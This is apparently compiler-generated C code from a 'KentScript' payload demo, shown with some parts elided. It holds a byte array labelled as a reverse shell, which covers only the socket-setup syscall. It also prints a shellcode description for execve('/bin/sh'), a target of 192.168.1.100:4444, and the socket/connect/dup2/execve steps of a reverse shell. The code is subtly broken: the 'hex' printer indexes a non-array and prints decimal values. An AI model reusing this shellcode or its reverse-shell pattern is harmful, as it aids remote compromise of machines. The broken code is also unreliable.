...
ks_val_t print_hex(ks_val_t data);
...
static ks_val_t _arr_REVERSE_SHELL[] = {(ks_val_t){.tag=KS_T_INT,.as.i=72LL}, (ks_val_t){.tag=KS_T_INT,.as.i=49LL}, (ks_val_t){.tag=KS_T_INT,.as.i=192LL}, (ks_val_t){.tag=KS_T_INT,.as.i=72LL}, (ks_val_t){.tag=KS_T_INT,.as.i=49LL}, (ks_val_t){.tag=KS_T_INT,.as.i=255LL}, (ks_val_t){.tag=KS_T_INT,.as.i=72LL}, (ks_val_t){.tag=KS_T_INT,.as.i=49LL}, (ks_val_t){.tag=KS_T_INT,.as.i=246LL}, (ks_val_t){.tag=KS_T_INT,.as.i=72LL}, (ks_val_t){.tag=KS_T_INT,.as.i=49LL}, (ks_val_t){.tag=KS_T_INT,.as.i=210LL}, (ks_val_t){.tag=KS_T_INT,.as.i=77LL}, (ks_val_t){.tag=KS_T_INT,.as.i=49LL}, (ks_val_t){.tag=KS_T_INT,.as.i=192LL}, (ks_val_t){.tag=KS_T_INT,.as.i=106LL}, (ks_val_t){.tag=KS_T_INT,.as.i=2LL}, (ks_val_t){.tag=KS_T_INT,.as.i=95LL}, (ks_val_t){.tag=KS_T_INT,.as.i=106LL}, (ks_val_t){.tag=KS_T_INT,.as.i=1LL}, (ks_val_t){.tag=KS_T_INT,.as.i=94LL}, (ks_val_t){.tag=KS_T_INT,.as.i=106LL}, (ks_val_t){.tag=KS_T_INT,.as.i=41LL}, (ks_val_t){.tag=KS_T_INT,.as.i=88LL}, (ks_val_t){.tag=KS_T_INT,.as.i=15LL}, (ks_val_t){.tag=KS_T_INT,.as.i=5LL}};
ks_array REVERSE_SHELL = { .data = _arr_REVERSE_SHELL, .length = 26 };

#line 18 "examples/payload_demo.ks"
ks_val_t print_hex(ks_val_t data) {
    char* hex_str = "";
    for (long long _idx_byte = 0; _idx_byte < 5; _idx_byte++) {
        long long byte = data[_idx_byte];
        hex_str = _ks_concat(_ks_concat(hex_str, _ks_str_int(byte)), " ");
    }
    return ks_str(hex_str);
    return ks_none();
}

#line 26 "examples/payload_demo.ks"
void ks_user_main(void) {
    ks_val_print(ks_str("=== KentScript Payload Demo ===")); printf("\n");
    ks_val_print(ks_str("")); printf("\n");
    ks_val_print(ks_str("[*] Shellcode: execve('/bin/sh')")); printf("\n");
    ks_val_print(ks_str(_ks_concat(_ks_concat("    Size: ", _ks_str_int(ks_array_len(SHELLCODE))), " bytes"))); printf("\n");
    ks_val_print(ks_str(_ks_concat("    Bytes: ", _ks_str_array(SHELLCODE.data, SHELLCODE.length)))); printf("\n");
    ks_val_print(ks_str("")); printf("\n");
    ks_val_print(ks_str("[*] Reverse Shell Template")); printf("\n");
    ks_val_print(ks_str(_ks_concat(_ks_concat("    Size: ", _ks_str_int(ks_array_len(REVERSE_SHELL))), " bytes"))); printf("\n");
    ks_val_print(ks_str("    Target: 192.168.1.100:4444")); printf("\n");
    ks_val_print(ks_str("")); printf("\n");
    ks_val_print(ks_str("[*] Payload Structure:")); printf("\n");
    ks_val_print(ks_str("    - socket(AF_INET, SOCK_STREAM, 0)")); printf("\n");
    ks_val_print(ks_str("    - connect(sockfd, &addr, sizeof(addr))")); printf("\n");
    ks_val_print(ks_str("    - dup2(sockfd, 0/1/2)")); printf("\n");
    ks_val_print(ks_str("    - execve('/bin/sh', NULL, NULL)")); printf("\n");
    ks_val_print(ks_str("")); printf("\n");
